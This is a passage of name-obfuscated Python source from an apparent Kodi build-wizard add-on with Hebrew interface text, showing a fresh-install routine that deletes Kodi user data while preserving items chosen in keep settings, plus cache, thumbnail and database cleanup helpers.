				elif OOO0OO00OO0O0O0O0 =='MyVideos116.db'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4897
				elif OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4898
				elif OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'skin.anonymous.mod'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4899
				elif OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'skin.Premium.mod'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4900
				elif OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'skin.anonymous.nox'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4901
				elif OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'skin.phenomenal'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4902
				elif OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'plugin.video.metalliq'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4903
				elif OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'skin.titan'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4905
				elif OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'pvr.iptvsimple'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4906
				elif OOO0OO00OO0O0O0O0 =='sources.xml'and OO0OO0OOO0O0OOO00 [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4908
				elif OOO0OO00OO0O0O0O0 =='quicknav.DATA.xml'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4911
				elif OOO0OO00OO0O0O0O0 =='x1101.DATA.xml'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4912
				elif OOO0OO00OO0O0O0O0 =='b-srtym-b.DATA.xml'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4913
				elif OOO0OO00OO0O0O0O0 =='x1102.DATA.xml'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4914
				elif OOO0OO00OO0O0O0O0 =='b-sdrvt-b.DATA.xml'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4915
				elif OOO0OO00OO0O0O0O0 =='x1112.DATA.xml'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4916
				elif OOO0OO00OO0O0O0O0 =='b-tlvvyzyh-b.DATA.xml'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4917
				elif OOO0OO00OO0O0O0O0 =='x1111.DATA.xml'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4918
				elif OOO0OO00OO0O0O0O0 =='b-tvknyshrly-b.DATA.xml'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4919
				elif OOO0OO00OO0O0O0O0 =='x1110.DATA.xml'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4920
				elif OOO0OO00OO0O0O0O0 =='b-yldym-b.DATA.xml'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4921
				elif OOO0OO00OO0O0O0O0 =='x1114.DATA.xml'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4922
				elif OOO0OO00OO0O0O0O0 =='b-mvzyqh-b.DATA.xml'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4923
				elif OOO0OO00OO0O0O0O0 =='mainmenu.DATA.xml'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4924
				elif OOO0OO00OO0O0O0O0 =='skin.Premium.mod.properties'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4925
				elif OOO0OO00OO0O0O0O0 =='x1122.DATA.xml'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4927
				elif OOO0OO00OO0O0O0O0 =='b-spvrt-b.DATA.xml'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4928
				elif OOO0OO00OO0O0O0O0 =='favourites.xml'and OO0OO0OOO0O0OOO00 [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4933
				elif OOO0OO00OO0O0O0O0 =='guisettings.xml'and OO0OO0OOO0O0OOO00 [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4935
				elif OOO0OO00OO0O0O0O0 =='profiles.xml'and OO0OO0OOO0O0OOO00 [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4936
				elif OOO0OO00OO0O0O0O0 =='advancedsettings.xml'and OO0OO0OOO0O0OOO00 [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4937
				elif OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4938
				elif OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'program.apollo'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4939
				elif OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'plugin.video.allmoviesin'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4940
				elif OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'plugin.video.elementum'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4943
				elif OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'service.subtitles.All_Subs'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4944
				elif OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'plugin.audio.soundcloud'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4945
				elif OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'weather.yahoo'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4946
				elif OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'plugin.video.quasar'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4947
				elif OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'program.apollo'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4948
				elif OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4949
				elif OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'plugin.video.playlistLoader'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4950
				elif OOO0OO00OO0O0O0O0 in LOGFILES :wiz .log ("Keep Log File: %s"%OOO0OO00OO0O0O0O0 ,xbmc .LOGNOTICE )#line:4951
				elif OOO0OO00OO0O0O0O0 .endswith ('.db'):#line:4952
					try :#line:4953
						if OOO0OO00OO0O0O0O0 ==O0OO0OO0O0OO00O00 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(OOO0OO00OO0O0O0O0 ,KODIV ),xbmc .LOGNOTICE )#line:4954
						else :os .remove (os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ))#line:4955
					except Exception as OOOOOO00O0O00O000 :#line:4956
						if not OOO0OO00OO0O0O0O0 .startswith ('Textures13'):#line:4957
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4958
							wiz .log ("-> %s"%(str (OOOOOO00O0O00O000 )),xbmc .LOGNOTICE )#line:4959
							wiz .purgeDb (os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ))#line:4960
				else :#line:4961
					DP .update (int (wiz .percentage (O00O00O0O000OOOOO ,O0O0O0OOO0O000OOO )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO00OO0O0O0O0 ),'')#line:4962
					try :os .remove (os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ))#line:4963
					except Exception as OOOOOO00O0O00O000 :#line:4964
						wiz .log ("Error removing %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4965
						wiz .log ("-> / %s"%(str (OOOOOO00O0O00O000 )),xbmc .LOGNOTICE )#line:4966
			if DP .iscanceled ():#line:4967
				DP .close ()#line:4968
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4969
				return False #line:4970
		for O0O00OO00O0O0OOOO ,OOOO0O0000O0O000O ,O0OOOOO0O000OO00O in os .walk (O0OOOO0OOOOOOO00O ,topdown =True ):#line:4971
			OOOO0O0000O0O000O [:]=[O0OOOOO00OO000O00 for O0OOOOO00OO000O00 in OOOO0O0000O0O000O if O0OOOOO00OO000O00 not in EXCLUDES ]#line:4972
			for OOO0OO00OO0O0O0O0 in OOOO0O0000O0O000O :#line:4973
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0OO00OO0O0O0O0 ),'')#line:4974
			  if OOO0OO00OO0O0O0O0 not in ["Database","userdata","temp","addons","addon_data"]:#line:4975
			   if not (OOO0OO00OO0O0O0O0 =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4976
			    if not (OOO0OO00OO0O0O0O0 =='skin.titan'and KEEPSKIN3 =='true'):#line:4978
			      if not (OOO0OO00OO0O0O0O0 =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4979
			       if not (OOO0OO00OO0O0O0O0 =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:4980
			        if not (OOO0OO00OO0O0O0O0 =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:4981
			         if not (OOO0OO00OO0O0O0O0 =='program.apollo'and KEEPINFO =='true'):#line:4982
			          if not (OOO0OO00OO0O0O0O0 =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:4983
			           if not (OOO0OO00OO0O0O0O0 =='weather.yahoo'and KEEPWEATHER =='true'):#line:4984
			            if not (OOO0OO00OO0O0O0O0 =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:4985
			             if not (OOO0OO00OO0O0O0O0 =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:4986
			              if not (OOO0OO00OO0O0O0O0 =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:4987
			               if not (OOO0OO00OO0O0O0O0 =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:4988
			                if not (OOO0OO00OO0O0O0O0 =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:4989
			                 if not (OOO0OO00OO0O0O0O0 =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:4990
			                  if not (OOO0OO00OO0O0O0O0 =='plugin.video.neptune'and KEEPINFO =='true'):#line:4991
			                   if not (OOO0OO00OO0O0O0O0 =='plugin.video.youtube'and KEEPINFO =='true'):#line:4992
			                    if not (OOO0OO00OO0O0O0O0 =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:4993
			                     if not (OOO0OO00OO0O0O0O0 =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:4994
			                       if not (OOO0OO00OO0O0O0O0 =='service.subtitles.All_Subs'and KEEPINFO =='true'):#line:4996
			                           if not (OOO0OO00OO0O0O0O0 =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5000
			                            if not (OOO0OO00OO0O0O0O0 =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5001
			                             if not (OOO0OO00OO0O0O0O0 =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5002
			                              if not (OOO0OO00OO0O0O0O0 =='plugin.video.quasar'and KEEPINFO =='true'):#line:5003
			                               if not (OOO0OO00OO0O0O0O0 =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5004
			                                  shutil .rmtree (os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),ignore_errors =True ,onerror =None )#line:5006
			if DP .iscanceled ():#line:5007
				DP .close ()#line:5008
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5009
				return False #line:5010
		DP .close ()#line:5011
		wiz .clearS ('build')#line:5012
		if over ==True :#line:5013
			return True #line:5014
		elif install =='restore':#line:5015
			return True #line:5016
		elif install :#line:5017
			buildWizard (install ,'normal',over =True )#line:5018
		else :#line:5019
			if INSTALLMETHOD ==1 :O00000OOO00O00OOO =1 #line:5020
			elif INSTALLMETHOD ==2 :O00000OOO00O00OOO =0 #line:5021
			else :O00000OOO00O00OOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5022
			if O00000OOO00O00OOO ==1 :wiz .reloadFix ('fresh')#line:5023
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5024
	else :#line:5025
		if not install =='restore':#line:5026
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5027
			wiz .refresh ()#line:5028
def clearCache ():#line:5033
		wiz .clearCache ()#line:5034
def fixwizard ():#line:5038
		wiz .fixwizard ()#line:5039
def totalClean ():#line:5041
		wiz .clearCache ()#line:5043
		wiz .clearPackages ('total')#line:5044
		clearThumb ('total')#line:5045
		cleanfornewbuild ()#line:5046
def cleanfornewbuild ():#line:5047
		try :#line:5048
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5049
		except :#line:5050
			pass #line:5051
		try :#line:5052
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5053
		except :#line:5054
			pass #line:5055
		try :#line:5056
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5057
		except :#line:5058
			pass #line:5059
def clearThumb (type =None ):#line:5060
	O0OOOO0O00O0OOO00 =wiz .latestDB ('Textures')#line:5061
	if not type ==None :O0O0OO00O0OOOO0OO =1 #line:5062
	else :O0O0OO00O0OOOO0OO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,O0OOOO0O00O0OOO00 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5063
	if O0O0OO00O0OOOO0OO ==1 :#line:5064
		try :wiz .removeFile (os .join (DATABASE ,O0OOOO0O00O0OOO00 ))#line:5065
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (O0OOOO0O00O0OOO00 )#line:5066
		wiz .removeFolder (THUMBS )#line:5067
	else :wiz .log ('Clear thumbnames cancelled')#line:5069
	wiz .redoThumbs ()#line:5070
def purgeDb ():#line:5072
	O00000OOO00O000OO =[];O0O0O0O00OOOOOO00 =[]#line:5073
	for OOO00O0OOOOOOOO00 ,O0OOOO0OO0O000000 ,OO000O00O0OOO00OO in os .walk (HOME ):#line:5074
		for O0O0OOO000O0O0O0O in fnmatch .filter (OO000O00O0OOO00OO ,'*.db'):#line:5075
			if O0O0OOO000O0O0O0O !='Thumbs.db':#line:5076
				O0O0O00OOOOO0OO0O =os .path .join (OOO00O0OOOOOOOO00 ,O0O0OOO000O0O0O0O )#line:5077
				O00000OOO00O000OO .append (O0O0O00OOOOO0OO0O )#line:5078
				O00O0OO0O00OO0O0O =O0O0O00OOOOO0OO0O .replace ('\\','/').split ('/')#line:5079
				O0O0O0O00OOOOOO00 .append ('(%s) %s'%(O00O0OO0O00OO0O0O [len (O00O0OO0O00OO0O0O )-2 ],O00O0OO0O00OO0O0O [len (O00O0OO0O00OO0O0O )-1 ]))#line:5080
	if KODIV >=16 :#line:5081
		O0OO0OO0O000OO0O0 =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0O0O0O00OOOOOO00 )#line:5082
